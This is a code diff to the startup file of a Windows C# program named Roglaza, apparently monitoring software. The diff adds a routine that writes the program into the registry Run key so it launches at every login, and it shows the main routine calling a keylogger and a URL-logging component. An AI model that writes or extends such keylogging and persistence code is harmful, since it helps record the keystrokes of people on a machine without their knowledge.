@@ -1,4 +1,5 @@
-﻿using Roglaza.Classes;
+﻿using Microsoft.Win32;
+using Roglaza.Classes;
 using Roglaza.Forms;
 using System;
 using System.Collections.Generic;
@@ -16,16 +17,11 @@ namespace Roglaza
         /// 
         [STAThread]
 
+
          public static void Main()
         {
 
-
-            //string s = @"C:\Users\Exception\Documents\Visual Studio 2012\Projects\ReadBrowserhistory\ReadBrowserhistory\bin\Debug\ReadBrowserhistory.exe";
-            //var cc = System.IO.File.ReadAllBytes(s);
-            //string x = "";
-            //foreach (var f in cc)
-            //    x += f.ToString() + ", ";
-            //RoglazaHelper.FileWriteText("aaaaaaaaaaaaaaaaaaaa", x);
+ 
             
             try
             {
@@ -43,10 +39,31 @@ namespace Roglaza
                StandAlone_Executables.Execute_Urler(true);
 
                 KeyLogger.XMain();
+
+                if (Roglaza.Program.WillExit)
+                    Application.Exit();
+              
             }
             catch(Exception e) { MessageBox.Show(e.Message); }
         }
+        static RegistryKey rkApp = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
+ 
+        public static void RunAtStartUp(bool action)
+         {
+             try
+             {
 
+                 if (action)
+                     // Add the value in the registry so that the application runs at startup
+                     rkApp.SetValue("Roglaza", Application.ExecutablePath);                                     
+                 else
+                     // Remove the value from the registry so that the application doesn't start
+                     rkApp.DeleteValue("Roglaza", false);
+
+
+             }
+             catch { }
+         }
      
         public  static void Exec()
         {
@@ -58,18 +75,19 @@ namespace Roglaza
             if (RoglazaInstaller.IsAdminUnistalledMe())
             {
                 MessageBox.Show(MessageStrings.GetTurned_off_reactivate_message(), MessageStrings.GetTurned_off_reactivate_message_caption);
-                try { System.Diagnostics.Process.Start(RoglazaInstaller.GetRoglazaAPPDataPath()); }catch { }               
+                try { System.Diagnostics.Process.Start(RoglazaInstaller.GetRoglazaAPPDataPath()); }catch { }
+                RunAtStartUp(false);
                 return;
             }
 
             //Detecting test mode
             AppInfo.TestMode = Application.StartupPath.Contains(@"\Roglaza\bin") || RoglazaHelper.IsExistedFile("testmode");
             RoglazaInstaller.InstallDirectories();
+            RunAtStartUp(true);
 
             bool Force_creat = RoglazaHelper.IsExistedFile(Application.StartupPath + "\\create");             
             if (ProgramSettings.LoadFromFile()|| Force_creat )
             {
-           // try {   DBManager.CreateNewDataBase();   }catch{}
                 try
                 {
                     var f = new FrmAdminPanel();
